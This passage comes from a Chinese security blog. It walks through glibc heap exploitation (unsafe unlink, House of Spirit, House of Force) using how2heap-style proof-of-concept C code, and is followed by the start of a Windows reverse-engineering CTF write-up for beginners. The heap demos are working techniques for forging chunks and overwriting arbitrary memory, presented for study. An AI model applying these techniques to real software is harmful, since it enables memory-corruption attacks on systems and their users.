+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序首先malloc了chunk0和chunk1，接下来对chunk0的offset2、3处做了赋值操作，根据上面的chunk结构我们很明显可以看出这是在user data里面选择了一片空间进行操作，它特意隔开了两个size，这两个size也就是一个正常的chunk所需的header部分，也就是说我们在伪造一个chunk（这个程序留出来的两个size真正的用处是实现该处地址的读写）。</p>
+<p>接下来程序修改了chunk1的内容，首先通过chunk1_ptr - header_size的方式找到了chunk1_header地址（这里的2实际上是2*sizeof(ptr)），接下来的任务就简单了，将prev_size改为我们malloc的size，而将chunk_size的后三位flag进行修改，将上一个chunk视为free可合并状态。</p>
+<p>如此，在free chunk1时，我们伪造的chunk0由于同样是free状态，就会发生合并，而合并的过程如下（以下的chunk0指我们伪造的chunk0，true_chunk是我们真的chunk0）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FD == chunk0-&gt;fd == true_chunk - 3*size</span><br><span class="line">FD-&gt;bk == true_chunk </span><br><span class="line">true_chunk --&gt; chunk0</span><br></pre></td></tr></table></figure>
+<p>那也就是说，我们将chunk0设置为目的地址，也就是true_chunk[3]，就可以通过true_chunk[0]来修改里面的内容了，这也就是为什么最后程序成功修改了victim_string的原因。</p>
+<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>house_of_Spirit技术大概上讲的是将已经存在的指针指向我们伪造的chunk（可以位于堆栈、BSS段等等），之后欺骗glibc的相关检查，free进入bin</p>
+<p>由于how2heap上的代码有点太多了，所以这里我们用一个简单的demo先来学习一下，代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> pre_size;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> *<span class="title">bk</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> <span class="title">fake_chunks</span>[2];</span></span><br><span class="line"><span class="keyword">void</span> *ptr,*victim;</span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">fake_chunks[<span class="number">0</span>].size=<span class="keyword">sizeof</span>(struct fast_chunk);</span><br><span class="line">fake_chunks[<span class="number">1</span>].size=<span class="keyword">sizeof</span>(struct fast_chunk);</span><br><span class="line">ptr=(<span class="keyword">void</span> *)&amp;fake_chunks[<span class="number">0</span>].fd;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">victim=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到首先我们在栈上分配了两个我们自己定义的chunk，接着malloc了真的，之后设置了自定义chunk的size的值，free了我们自定义的chunk，再次malloc时，我们会发现victim就是我们伪造的chunk了。</p>
+<p>那么问题来了，为什么我们在伪造chunk的时候只是设置了size部分呢？这就要读一下free相关的源码了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">public_fRE</span><span class="params">(Void_t* mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p; </span><br><span class="line">    ...</span><br><span class="line">    p = mem2chunk(mem);    <span class="comment">//找到了mem的chunk地址</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))   <span class="comment">//检查chunk的mmp位</span></span><br><span class="line">    &#123;</span><br><span class="line">        munmap_chunk(p);       <span class="comment">//用unmmap的方式取消映射</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ar_ptr = arena_for_chunk(p);  <span class="comment">//找到chunk对应的area</span></span><br><span class="line">    ...</span><br><span class="line">    _int_free(ar_ptr, mem);       <span class="comment">//调用init_free（）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _int_free(mstate av, Void_t* mem)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p;</span><br><span class="line">    INTERNAL_SIZE_T size; </span><br><span class="line">    mfastbinptr* fb; </span><br><span class="line">    ...</span><br><span class="line">    p = mem2chunk(mem);   <span class="comment">//找到了mem的chunk</span></span><br><span class="line">    size = chunksize(p);   <span class="comment">//获得chunk的size</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast))    <span class="comment">//当前chunk的size字段的比较，不能超过fastbin的最大值</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">            || __builtin_expect(chunksize(chunk_at_offset(p, size))</span><br><span class="line">                                            &gt;= av-&gt;system_mem, <span class="number">0</span>))            <span class="comment">//比较下一个chunk的size字段，2*SIZE_ZE&lt;chunksize&lt;av-&gt;system_mem</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);</span><br><span class="line">        ...</span><br><span class="line">        p-&gt;fd = *fb;</span><br><span class="line">        *fb = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>试了一下这个简单的demo之后再去看how2heap上的代码就很简单了，同样是伪造chunk，不过就是伪造chunk的手段不一样（how2heap中运用了一个较大的数组人工划分了两个chunk）。</p>
+<p>还有一点就是两个例子中的size都不大，这是为了free后进入的是fastbin，前面free的源码中也表明了，如果你的size不够fastbin要求的话是根本没法触发之后的操作的。</p>
+<h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h2><p>主要是针对top chunk，通过修改top chunk来malloc任意地址</p>
+<p>还是先看源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">"This is a string that we want to overwrite."</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Its current value is: %s\n"</span>, bss_var);</span><br><span class="line">	<span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n"</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">	*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line">	<span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">	<span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... old string: %s\n"</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... doing strcpy overwrite with \"YEAH!!!\"...\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">"YEAH!!!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... new string: %s\n"</span>, bss_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个例子的目的就是改写我们一开始的变量bss_var的值，首先我们malloc了p1，然后通过了计算得到了top的地址。这怎么算出来的呢？我们都知道malloc返回的地址并不是真正的chunk起始地址，而是chunk除去了chunk header的部分，所以我们先先去2*size得到chunk的真正地址，接着再算一下chunk的real size（也就是chunk实际用的大小加上chunk header的大小），二者相加就得到了top的地址。当然实际上算的时候没这么麻烦。。。那我们就可以构想一下了，假如我现在想要malloc返回任意的地址，以上述代码中的bss_var为例，那我的目标就是应该malloc时，top_chunk恰好等于我的地址，所以我们首先需要一个构造一个evil_size使得malloc(evil_Size)后我们的top chunk恰好到了我们想让它到的地方，而这个</p>
+<p>。。。。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/25/windows礼包/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/25/windows礼包/" itemprop="url">windows礼包</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-25T09:36:00+08:00">
+                2018-12-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/逆向/" itemprop="url" rel="index">
+                    <span itemprop="name">逆向</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>在翻hctf的大佬以前的博客时看见了几道不错的Windows逆向题目，正好到了带新生的时候，详细写写wp也算是带新生入门吧</strong></p>
+<p>网盘链接：链接:<a href="https://pan.baidu.com/s/1F0bg1rS2gtDNZuO7falRjg" target="_blank" rel="noopener">https://pan.baidu.com/s/1F0bg1rS2gtDNZuO7falRjg</a>  密码:nhru</p>
+<h1 id="Broken-Windows"><a href="#Broken-Windows" class="headerlink" title="Broken Windows"></a>Broken Windows</h1><p>拿peid查一下壳，这里就不再放截图（懒的打开虚拟机了。。。）了，发现有upx壳，可以手脱也可以工具直接脱，也不再演示了</p>
+<p>ida载入发现停在了WinMain这个地方。可能大家对这个函数还不是很熟悉，简单提及一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="keyword">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DialogBoxParamA(hInstance, <span class="number">0x65</span>, <span class="number">0</span>, DialogFunc, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>WinMain是一个函数，该函数的功能是被<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/861110" target="_blank" rel="noopener">系统调用</a>，作为一个32位应用程序的<a href="https://baike.baidu.com/item/%E5%85%A5%E5%8F%A3%E7%82%B9/10933004" target="_blank" rel="noopener">入口点</a>。WinMain函数应初始化应用程序，显示主窗口，进入一个消息接收一发送循环，这个循环是应用程序执行的其余部分的顶级控制结构。</p>
+</blockquote>
+<p>可以看到这个函数有两个关键的词了，第一个就是入口点，你可以简单的理解为windows窗口中的main函数（没学过c语言的新生就当是程序从此处开始执行代码吧），接着再来看函数的内容。可以看到WinMain又去调用DialogBoxParam函数，然后就return了，似乎什么也没有干…吗？这其实就是第二个关键词了，循环，可以想象一下我们常用的windows应用窗口界面（比如你打个游戏什么的），他们可不会说是执行完你的操作就跟完事了，他们依然在循环等待着你的操作。</p>
+<p>对这个结构有了一些了解之后我们接着看DialogBoxParam这个函数，简单说就是创建一个对话框，然后用你的第四个参数（也就是某个函数）去处理这个对话框的具体过程，所以我们下一步的分析重点就应该是它，接下来我们就点进去看一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">BOOL __<span class="function">stdcall <span class="title">DialogFunc</span><span class="params">(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HWND v5; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x111</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">274</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">61536</span> )</span><br><span class="line">        EndDialog(hWnd, <span class="number">61536</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x111</span>u:</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( a3 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = GetDlgItem(hWnd, <span class="number">1001</span>);</span><br><span class="line">          SendMessageA(v5, <span class="number">0xD</span>u, <span class="number">0x21</span>u, dword_403428);</span><br><span class="line">          qmemcpy(Caption, dword_403428, <span class="number">0x23</span>u);</span><br><span class="line">          CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_401020, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF</span>u:</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        hdc = BeginPaint(hWnd, &amp;Paint);</span><br><span class="line">        hdcSrc = CreateCompatibleDC(hdc);</span><br><span class="line">        SelectObject(hdcSrc, h);</span><br><span class="line">        BitBlt(hdc, <span class="number">0</span>, <span class="number">0</span>, dword_403414, cy, hdcSrc, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xCC0020</span>u);</span><br><span class="line">        DeleteDC(hdcSrc);</span><br><span class="line">        EndPaint(hWnd, &amp;Paint);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x110</span>u:</span><br><span class="line">        hDlg = hWnd;</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_401160, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        dword_40339C = GetWindowLongA(hWnd, <span class="number">-6</span>);</span><br><span class="line">        h = LoadBitmapA(dword_40339C, <span class="number">0x66</span>);</span><br><span class="line">        GetObjectA(h, <span class="number">24</span>, &amp;unk_403410);</span><br><span class="line">        SetWindowPos(hWnd, HWND_MESSAGE|<span class="number">0x2</span>, <span class="number">0</span>, <span class="number">0</span>, dword_403414, cy, <span class="number">6u</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到有大量的函数调用，而且全部都是系统API，如果是比赛场上第一次做这种题，一个一个去学习函数似乎难度系数就有点大了，那我们该怎么去找关键函数呢？这里有三种办法，一是我们从ida给我们的Function窗口中去人工找key function，因为这道题目函数不是很多所以很容易定位到关键的加密函数，之后我们在函数名处按x键就可以找到该函数在哪些地方被调用过，跟过去就可以大体了解到DialogFunc的逻辑了；第二种方法就是去找CreateThread一类的函数，这是windows编程中常用的一种操作，这类函数有什么作用呢？其实他会创建一个线程（可以想象成一个子程序），然后根据你传入的第四个参数（也是个函数）来执行；第三就是提前了解一下这些的作用喽，其实他们都对应的不同的消息响应，在下边一个题目中会具体提到。</p>
+<p>通过这几种方法我们找到了这两个关键的函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD __<span class="function">stdcall <span class="title">sub_401160</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_401080(byte_403018);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">DWORD __<span class="function">stdcall <span class="title">sub_401020</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  v1 = sub_401080(dword_403428);</span><br><span class="line">  v2 = sub_401080(v1);</span><br><span class="line">  sub_401080(v2);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( dword_403428[v4] == byte_403018[v4] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 -= <span class="number">4</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      MessageBoxA(<span class="number">0</span>, Caption, Caption, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 